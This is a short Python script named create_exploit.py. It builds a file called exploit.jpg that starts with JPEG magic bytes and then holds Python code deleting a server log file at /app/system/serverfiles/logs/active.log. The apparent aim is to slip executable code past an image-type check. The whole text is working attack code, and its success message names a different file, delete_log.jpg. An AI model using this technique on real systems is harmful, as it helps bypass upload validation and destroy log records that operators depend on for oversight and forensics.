# create_exploit.py
JPEG_MAGIC = b'\xFF\xD8\xFF'
PYTHON_CODE = b"""
import os
os.remove('/app/system/serverfiles/logs/active.log')
"""

with open('exploit.jpg', 'wb') as f:
    f.write(JPEG_MAGIC)
    f.write(b'\n')
    f.write(PYTHON_CODE)

print("Файл delete_log.jpg создан!")